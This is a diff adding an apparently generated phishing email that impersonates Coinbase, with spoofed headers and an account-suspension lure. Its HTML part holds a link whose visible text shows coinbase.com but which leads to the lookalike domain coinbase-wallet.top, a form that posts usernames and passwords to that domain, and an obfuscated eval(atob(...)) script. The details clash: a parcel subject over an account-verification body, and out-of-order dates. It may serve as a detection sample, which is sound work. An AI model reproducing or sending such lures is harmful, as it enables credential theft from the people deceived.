@@ -1,0 +1,31 @@
+From: notice@coinbase-wallet.top
+To: victim45@example.com
+Subject: Your parcel could not be delivered - click here
+Date: Tue, 28 Mar 2002 19:14:00 -0500
+Message-ID: <phish-225-080c535d-61d0-4c27-9119-d34aa60537af@coinbase-wallet.top>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 04 Mar 2002 01:55:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 15 Mar 2002 04:27:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 14 Mar 2002 09:33:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 14 Mar 2002 07:49:00 -0500
+Return-Path: <bounce@mail-aeb03fab.top>
+Reply-To: recovery5@gmail.com
+Authentication-Results: mx.example.com; spf=fail smtp.mailfrom=mail-aeb03fab.top; dkim=fail header.d=coinbase-wallet.top; dmarc=fail header.from=coinbase-wallet.top
+Received-SPF: fail (mx.example.com: domain of notice@coinbase-wallet.top does not designate 203.0.113.10 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=coinbase-wallet.top; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-225-1911c49f"
+
+--bnd-p-225-1911c49f
+Content-Type: text/plain; charset="UTF-8"
+
+Dear customer,
+
+We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.
+http://coinbase-wallet.top/login
+
+Reference: PC1F491
+--bnd-p-225-1911c49f
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Dear customer,<br/><br/>We detected unusual activity on your account. You must verify your account immediately or it will be suspended. Click here to sign in and confirm your identity.<br/>http://coinbase-wallet.top/login<br/><br/>Reference: PC1F491</p><p><a href="http://coinbase-wallet.top/login">https://www.coinbase.com/signin</a></p><form action="http://coinbase-wallet.top/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-225-1911c49f--
